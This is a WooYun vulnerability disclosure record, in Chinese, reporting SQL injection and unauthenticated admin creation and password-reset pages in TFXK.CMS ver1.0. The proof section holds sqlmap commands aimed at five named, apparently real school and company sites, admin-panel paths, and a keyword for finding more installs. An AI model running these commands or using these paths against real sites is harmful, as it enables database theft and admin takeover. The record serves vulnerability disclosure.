{"id": 43431, "wybug_id": "wooyun-2014-082722", "wybug_title": "TFXK.CMS存在SQL注射及可任意添加管理员和无限制更改管理员密码", "wybug_corp": "四川天府星空网络科技有限公司", "wybug_author": "Yang", "wybug_date": "2014-11-13 11:34", "wybug_open_date": "2015-02-11 11:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "19", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "后台验证绕过", "数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 第一次提交这种通用性，很多规矩不懂呀。主要是蛮多教育网站在用。后来发现还有很多企业网站也在用。于是乎。提交了 详细说明：  #1.通用程序的介绍1、建站程序类型：ASPX+Access2、漏洞类型：SQL注入+任意添加管理员+任意更改管理员密码3、注入参数：①id   ②pid4、涉及版本：TFXK.CMS ver1.05、危害程度：高6、涉及厂商：四川天府星空网络科技有限公司7、厂商网站：http://www.tfxk.com8、安装量：多9、有无源代码分析：暂无10、枚举案例（应要求。枚举四个教育网站+ 一个企业网站） 【声明：以下提供的全部案例一方面证明通用型，一方面是给CNVD或Cncert测试，其他人不得用此作非法用途或者破坏操作，否则后果自负】http://www.lq22x.com/DangDetail.aspx?id=1901http://www.lqycsxx.com/DangDetail.aspx?id=1821&pid=68http://www.lq21xx.com/Teachers.aspx?pid=132http://www.lq25x.com/News.aspx?pid=8http://www.cdfrg.com/News.aspx?pid=147and  so  on\n\n网站后台：http://www.*****.com/Administrator/admin_login.aspx任意添加管理员：http://www.*****.com/administrator/admin/add.aspx任意查看管理员：http://www.*****.com/administrator/administrator/admin/admin.aspx         即可任意删除管理员和修改管理员密码   漏洞证明：  \n以下为SQL注射实例\n实例1：sqlmap.py -u \"http://www.lq22x.com/DangDetail.aspx?id=1901\" --tables\n\n实例2：sqlmap.py -u \"http://www.lqycsxx.com/DangDetail.aspx?id=1821&pid=68\" --tables\n\n实例3：sqlmap.py -u \"http://www.lq21xx.com/Teachers.aspx?pid=132\" --tables\n\n实例4：sqlmap.py -u \"http://www.lq25x.com/News.aspx?pid=8\" --tables\n\n实例5：sqlmap.py -u \"http://www.cdfrg.com/News.aspx?pid=147\" --tables\n\n\n以下为任意添加管理员+任意更改管理员密码实例\n这个网络科技公司的关键字很难构造。 可以通过搜索管理员后台关键字TFXK.CMS ver1.0可以找到一部分\n\n\n\n\n\n\n\n   修复方案：  第一次发通用好紧张。希望不足之处见谅。   版权声明：转载请注明来源 Yang@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-11-13 15:56 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:247 漏洞数:86        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  看来又白找了这漏洞……也蛮多教育站呀……    \n     2015-02-11 17:14 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  @Yang 能找到也算不错了    \n     2015-02-11 17:31 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:247 漏洞数:86        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  @0x 80 没你技术好呀……    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}